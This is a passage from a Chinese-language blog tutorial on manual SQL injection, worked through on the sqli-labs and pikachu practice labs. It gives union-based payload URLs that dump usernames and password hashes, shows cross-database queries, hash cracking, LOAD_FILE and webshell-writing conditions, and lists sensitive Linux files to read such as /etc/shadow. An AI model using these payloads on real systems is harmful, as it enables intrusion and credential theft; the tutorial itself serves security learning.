class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/yunkun18"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">数据库概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.</span> <span class="toc-text">关系型数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.</span> <span class="toc-text">非关系型数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E7%BA%A7"><span class="toc-number">2.</span> <span class="toc-text">常见的数据库层级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81Sql%E8%AF%AD%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">常见Sql语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="toc-number">4.</span> <span class="toc-text">SQL注入概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E8%87%AA%E5%B8%A6%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-number">5.</span> <span class="toc-text">MySQL自带系统库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema%E5%BA%93"><span class="toc-number">5.1.</span> <span class="toc-text">information_schema库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#performance-schema%E5%BA%93"><span class="toc-number">6.</span> <span class="toc-text">performance_schema库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E5%BA%93"><span class="toc-number">7.</span> <span class="toc-text">MySQL库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys%E5%BA%93"><span class="toc-number">8.</span> <span class="toc-text">sys库</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/ea185739.html" title="Sql注入之sqlmap的使用"><img src="/./img/sql_injection.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sql注入之sqlmap的使用"/></a><div class="content"><a class="title" href="/archives/ea185739.html" title="Sql注入之sqlmap的使用">Sql注入之sqlmap的使用</a><time datetime="2026-05-07T08:00:00.000Z" title="发表于 2026-05-07 16:00:00">2026-05-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/667bd3bf.html" title="CSRF漏洞渗透与防御"><img src="/./img/CSRF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSRF漏洞渗透与防御"/></a><div class="content"><a class="title" href="/archives/667bd3bf.html" title="CSRF漏洞渗透与防御">CSRF漏洞渗透与防御</a><time datetime="2026-05-05T12:00:00.000Z" title="发表于 2026-05-05 20:00:00">2026-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/f9945f65.html" title="JWT渗透与防御"><img src="/./img/JWT.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT渗透与防御"/></a><div class="content"><a class="title" href="/archives/f9945f65.html" title="JWT渗透与防御">JWT渗透与防御</a><time datetime="2026-04-28T12:00:00.000Z" title="发表于 2026-04-28 20:00:00">2026-04-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/2004793d.html" title="Sql注入之注入手法"><img src="/./img/sql_injection.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sql注入之注入手法"/></a><div class="content"><a class="title" href="/archives/2004793d.html" title="Sql注入之注入手法">Sql注入之注入手法</a><time datetime="2026-04-28T11:00:00.000Z" title="发表于 2026-04-28 19:00:00">2026-04-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/4a17b156.html" title="博客说明"><img src="https://jsd.012700.xyz/gh/jerryc127/CDN@latest/cover/default_bg3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客说明"/></a><div class="content"><a class="title" href="/archives/4a17b156.html" title="博客说明">博客说明</a><time datetime="2026-04-27T14:09:09.491Z" title="发表于 2026-04-27 22:09:09">2026-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By yunkun18</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div><div class="footer_custom_text">Hi, welcome to my <a href="https://blog.yunkun.top/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="/js/tw_cn.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+<p>这表示：查询 <code>users</code> 表中 <code>id</code> 等于页面传入值的所有记录。<code>*</code> 表示查询所有列。</p>
+<blockquote>
+<p>题外话：GET 和 POST 提交方式的区别是基础知识，可以补充学习。</p>
+</blockquote>
+<h2 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h2><ol>
+<li>判断注入点</li>
+<li>猜解列数量（<code>ORDER BY</code>）</li>
+<li>报错猜解，判断回显点</li>
+<li>信息收集</li>
+<li>使用 SQL 语句进行注入查询</li>
+</ol>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>判断注入点的方法很简单，例如传入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>后台拼接为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>由于 <code>1=1</code> 恒成立，语句不会报错。如果页面返回正常，通常说明该参数存在注入点。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423184325623.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423184355253.png"></p>
+<p>如果随意拼接非法字符出现报错，说明后台接收到了输入。若页面依然正常，则说明可能已被过滤或拦截。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423184431686.png"></p>
+<h3 id="猜解列数量：ORDER-BY"><a href="#猜解列数量：ORDER-BY" class="headerlink" title="猜解列数量：ORDER BY"></a>猜解列数量：<code>ORDER BY</code></h3><p><code>ORDER BY</code> 用于排序，后面跟数字表示按第几列排序。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423185544789.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423185615925.png"></p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>如果程序报错，说明当前查询只有 3 列数据。</p>
+<blockquote>
+<p>这个步骤很重要，后续使用 <code>UNION</code> 查询时必须知道字段数量。</p>
+</blockquote>
+<h3 id="报错猜解，判断回显点"><a href="#报错猜解，判断回显点" class="headerlink" title="报错猜解，判断回显点"></a>报错猜解，判断回显点</h3><p><code>UNION</code> 用于合并查询，关键特性：</p>
+<ul>
+<li><p>两个查询结果互不干扰</p>
+</li>
+<li><p>两边字段数量必须一致</p>
+</li>
+</ul>
+<p>先用 <code>ORDER BY</code> 猜列数，再用 <code>UNION</code> 确认回显位置。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423190154733.png"></p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">-1</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果页面显示了 <code>2</code> 和 <code>3</code>，说明当前页面存在回显点，可继续注入更多内容。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423190529501.png"></p>
+<p>将 <code>2</code>、<code>3</code> 替换成想要的数据，即可在页面中看到结果。</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>常用信息收集函数：</p>
+<ul>
+<li><p><code>version()</code>：查询数据库版本。</p>
+</li>
+<li><p><code>database()</code>：查询当前数据库名。</p>
+</li>
+<li><p><code>group_concat()</code>：合并结果，避免数据过多。</p>
+</li>
+<li><p><code>user()</code>：查询当前数据库用户。</p>
+</li>
+</ul>
+<p>如果当前用户是 <code>root</code>，说明权限最高。</p>
+<p>常见系统表：</p>
+<ul>
+<li><p><code>information_schema.SCHEMATA</code>：记录所有数据库名。</p>
+<ul>
+<li>关键字段：<code>SCHEMA_NAME</code></li>
+</ul>
+</li>
+<li><p><code>information_schema.TABLES</code>：记录所有表信息。</p>
+<ul>
+<li>关键字段：<code>TABLE_NAME</code></li>
+<li>关键字段：<code>TABLE_SCHEMA</code>（指定数据库）</li>
+</ul>
+</li>
+<li><p><code>information_schema.COLUMNS</code>：记录列信息。</p>
+<ul>
+<li>关键字段：<code>COLUMN_NAME</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="新手口诀"><a href="#新手口诀" class="headerlink" title="新手口诀"></a>新手口诀</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、查库用 SCHEMATA，字段就记 SCHEMA_NAME</span><br><span class="line">2、查表用 TABLES，字段 TABLE_SCHEMA（库）+ TABLE_NAME（表）</span><br><span class="line">3、查字段用 COLUMNS，字段 COLUMN_NAME 是核心</span><br><span class="line">4、系统库只认 information_schema，其他全忽略</span><br></pre></td></tr></table></figure>
+
+<h4 id="图表法"><a href="#图表法" class="headerlink" title="图表法"></a>图表法</h4><table>
+<thead>
+<tr>
+<th>目标</th>
+<th>系统表名</th>
+<th>核心字段</th>
+<th>记忆点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查数据库</td>
+<td>SCHEMATA</td>
+<td>SCHEMA_NAME</td>
+<td>库名</td>
+</tr>
+<tr>
+<td>查表</td>
+<td>TABLES</td>
+<td>TABLE_NAME</td>
+<td>表名</td>
+</tr>
+<tr>
+<td>查字段</td>
+<td>COLUMNS</td>
+<td>COLUMN_NAME</td>
+<td>字段名</td>
+</tr>
+</tbody></table>
+<h3 id="使用-SQL-语句进行注入查询"><a href="#使用-SQL-语句进行注入查询" class="headerlink" title="使用 SQL 语句进行注入查询"></a>使用 SQL 语句进行注入查询</h3><p>获取目标数据库、表名和字段名后，就可以做最终注入查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">-1</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, (</span><br><span class="line">  <span class="keyword">SELECT</span> GROUP_CONCAT(username,<span class="number">0x7e</span>,password)</span><br><span class="line">  <span class="keyword">FROM</span> users</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>0x7e</code> 是 <code>~</code> 的十六进制表示，用于分隔查询结果。</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><strong>以 sqli-labs 第二关为例</strong></p>
+<h3 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a>查询数据库版本</h3><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423213711237.png"></p>
+<p>获得数据库版本：<code>5.7.26</code></p>
+<h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423213830029.png"></p>
+<p>获得当前数据库名：<code>security</code></p>
+<h3 id="查询当前数据库的所有表名"><a href="#查询当前数据库的所有表名" class="headerlink" title="查询当前数据库的所有表名"></a>查询当前数据库的所有表名</h3><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423214452646.png"></p>
+<p>如果 <code>TABLE_SCHEMA</code> 返回异常，可改用 <code>database()</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423214740260.png"></p>
+<p>也可以将数据库名 <code>security</code> 转为十六进制：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7365637572697479</span><br></pre></td></tr></table></figure>
+
+<p>再进行查询。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423215335613.png"></p>
+<p>获得 <code>security</code> 库中的表：<code>emails</code>, <code>referers</code>, <code>uagents</code>, <code>users</code>。</p>
+<h3 id="查询重要表中的所有字段名"><a href="#查询重要表中的所有字段名" class="headerlink" title="查询重要表中的所有字段名"></a>查询重要表中的所有字段名</h3><p>请求示例：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-3 union select 1, 2, group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x7365637572697479 and TABLE_NAME=0x7573657273</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423215928397.png"></p>
+<p>获取到 <code>users</code> 表中的字段：<code>id</code>, <code>username</code>, <code>password</code>。</p>
+<h3 id="根据收集到的信息查询-users-表数据"><a href="#根据收集到的信息查询-users-表数据" class="headerlink" title="根据收集到的信息查询 users 表数据"></a>根据收集到的信息查询 users 表数据</h3><p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423220612541.png"></p>
+<h2 id="手工注入总结"><a href="#手工注入总结" class="headerlink" title="手工注入总结"></a>手工注入总结</h2><p>手工注入的基本步骤就是这样。虽然现在已有自动化工具 <code>sqlmap</code>，但手工注入流程仍是理解 SQL 注入、防护和绕过的基础。</p>
+<p>后续还可以继续学习：</p>
+<ul>
+<li><p>报错注入</p>
+</li>
+<li><p>延时注入</p>
+</li>
+<li><p>布尔盲注</p>
+</li>
+<li><p>WAF 绕过</p>
+</li>
+</ul>
+<p>地基要打牢，才能更好地使用工具和分析防护。</p>
+<hr>
+<h1 id="SQL注入之高权限注入"><a href="#SQL注入之高权限注入" class="headerlink" title="SQL注入之高权限注入"></a>SQL注入之高权限注入</h1><h2 id="数据库高权限用户"><a href="#数据库高权限用户" class="headerlink" title="数据库高权限用户"></a>数据库高权限用户</h2><p>对于 MySQL 来说，只有 <code>root</code> 是高权限用户，或者被 <code>root</code> 赋予管理员权限的用户。</p>
+<blockquote>
+<p>注意：这里所说的「用户」不是网站登录框里的用户，指的是 MySQL 中的数据库用户。</p>
+</blockquote>
+<p>网站用户和数据库用户必须区分。</p>
+<p>以 sqli-labs 靶场为例：</p>
+<p>根据之前的学习，我们能拿到 sqli-labs 靶场 <code>security</code> 数据库 <code>users</code> 表中的信息。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, 2, (select group_concat(username,0x7e, password) from users)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423220612541.png"></p>
+<p>这里拿到的用户都属于网站用户，不能用这些用户直接操作数据库。</p>
+<p>我们需要的是数据库高权限用户：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, 2, user()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260424191526650.png"></p>
+<p>使用数据库的 <code>user()</code> 函数查询出的才是数据库用户，<code>root</code> 代表最高权限用户，又称管理员用户。</p>
+<p>即使不是 <code>root</code>，也可以查看 <code>information_schema</code> 库中的当前数据库信息，只是不能跨库查询而已。</p>
+<h2 id="高权限用户的注入操作"><a href="#高权限用户的注入操作" class="headerlink" title="高权限用户的注入操作"></a>高权限用户的注入操作</h2><p>即使是普通用户，只要存在 SQL 注入漏洞，也很危险，能拿到的信息不少。</p>
+<p>高权限用户则有更多可操作空间。</p>
+<h3 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h3><p>查看当前数据库：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, 2, database()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423213830029.png"></p>
+<p>查看所有数据库：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, 2, (select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260424194720248.png"></p>
+<p>可以查看到其他数据库的信息。下面以另一个靶场 <code>pikachu</code> 的数据库为例，流程相同。</p>
+<p>因为编码问题，<code>pikachu</code> 转为十六进制为 <code>0x70696b61636875</code>。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, 2, (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x70696b61636875)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260424195640811.png"></p>
+<p>显然 <code>users</code> 表更有价值，接下来读取 <code>users</code> 表字段，<code>users</code> 也转为十六进制 <code>0x7573657273</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, 2, (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x70696b61636875 and TABLE_NAME=0x7573657273)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260424200522714.png"></p>
+<p>收集到信息后可以查询具体数据：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, 2, (select group_concat(username, &#x27;:&#x27;, password, &#x27;:&#x27;, level) from pikachu.users)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260424200910298.png"></p>
+<p>这里以 <code>,</code> 分割每组用户信息，以 <code>:</code> 分割单列信息，与之前的 <code>~</code> 效果类似。</p>
+<p><code>level</code> 字段通常用于权限控制，也可以查看。</p>
+<p>这里的 <code>password</code> 字段是加密后的，需要进一步破解，例如用 <code>hashcat</code>。</p>
+<p>在这个示例中，密码采用 MD5 加密，可以直接使用在线 MD5 解密网站，例如 <code>https://www.somd5.com</code>，破解后 <code>admin</code> 用户的密码为 <code>123456</code>。</p>
+<p>如果通过其他方法确认当前服务器能访问到 <code>pikachu</code> 网站，那么就相当于通过一个网站拿下了另一个网站，而且这还是管理员权限。</p>
+<p>当然这只是示例，真实环境通常更复杂，后续除了基础注入手法，还有绕过安全防护的方法。</p>
+<p>以下为 <code>pikachu</code> 靶场截图，<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/zhuifengshaonianhanlu/pikachu">点击下载</a>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260424202046579.png"></p>
+<p>这个靶场也很适合练手。</p>
+<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>文件读写的原理很简单：利用 MySQL 数据库的读写文件权限，向服务器写一句话木马，或读取服务器中的敏感文件。</p>
+<h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ol>
+<li>高权限用户 <code>root</code></li>
+<li>MySQL 的 <code>secure_file_priv</code> 限制了文件读写权限</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv = NULL</span><br><span class="line">含义：完全禁止文件读写（最严）</span><br><span class="line">注入影响：`LOAD_FILE()`、`INTO OUTFILE` 直接报错，读不了、写不了。</span><br><span class="line"></span><br><span class="line">secure_file_priv = &#x27;&#x27;（空字符串）</span><br><span class="line">含义：不限制目录（高危，老环境常见）</span><br><span class="line">注入影响：如果有 `FILE` 权限 + 知道网站绝对路径，可以直接 `INTO OUTFILE` 写 webshell。</span><br><span class="line"></span><br><span class="line">secure_file_priv = &#x27;/var/lib/MySQL-files/&#x27;（某目录）</span><br><span class="line">含义：只能在这个目录下读写</span><br><span class="line">注入影响：就算有 `FILE` 权限，也只能往这个目录写，一般不是网站根目录，拿不到 webshell。</span><br></pre></td></tr></table></figure>
+
+<p><code>secure_file_priv</code> 是 MySQL 的静态只读参数，运行时无法通过 SQL 注入或 SQL 命令在线修改，即使是 <code>root</code> 权限也不行。</p>
+<p>所以要先判断：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, 2, (select @@secure_file_priv)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425012224353.png"></p>
+<p>如果结果为 <code>NULL</code>，就表示不能进行文件读写。但即便如此，全库脱库、操作 <code>mysql.user</code>、添加或篡改数据库账号、留下后门账号等依旧很危险。</p>
+<p>如果出现如下结果，就说明可以在任意位置进行文件读写：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425012857641.png"></p>
+<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>读取文件使用 <code>LOAD_FILE()</code> 函数。我在服务器 D 盘放了一个文件 <code>test.txt</code>，内容为 <code>test:test</code>。</p>
+<p>文件路径可以直接用单引号包裹，也可以使用十六进制或 <code>CHAR()</code> 转换。下面示例尝试读取该文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425013844097.png"></p>
+<p>这样就能读取到文件内容。读取文件本身不难，难的是收集到足够的信息来判断哪些路径有用。</p>
+<blockquote>
+<p>以下为一些核心敏感文件路径，建议牢记。</p>
+</blockquote>
+<h4 id="Linux-核心敏感文件路径"><a href="#Linux-核心敏感文件路径" class="headerlink" title="Linux 核心敏感文件路径"></a>Linux 核心敏感文件路径</h4><ol>
+<li>系统账号密码 &#x2F; 系统配置</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd                        # 所有系统用户、shell 权限、账号列表</span><br><span class="line">/etc/shadow                        # 用户哈希密码（必须高权限/root 权限读取）</span><br><span class="line">/etc/group                         # 用户组权限配置</span><br><span class="line">/etc/sudoers                       # sudo 特权用户，提权关键</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>网络、域名、内网信息</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts                         # 本地域名解析、内网映射、后门 hosts</span><br><span class="line">/etc/resolv.conf                   # DNS 服务器地址，内网架构</span><br><span class="line">/etc/network/interfaces            # 网卡 IP、内网网段</span><br><span class="line">/proc/net/arp                      # 内网存活主机</span><br><span class="line">/proc/net/tcp                      # 开放端口、内网连接</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>服务配置（数据库 &#x2F; 网站中间件）</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/usr/local/mysql/my.cnf            # 全量 MySQL 配置、账号密码、端口</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf   # 中间件配置、网站绝对路径</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>网站源码 &#x2F; 配置（重要！可查看配置文件拿后台密钥，或直接审计源码找漏洞）</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/xxx/config.php</span><br><span class="line">/home/wwwroot/网站目录/config.php</span><br><span class="line">/var/www/conf/web.config</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>日志文件（留痕、路径泄露）</li>
+</ol>
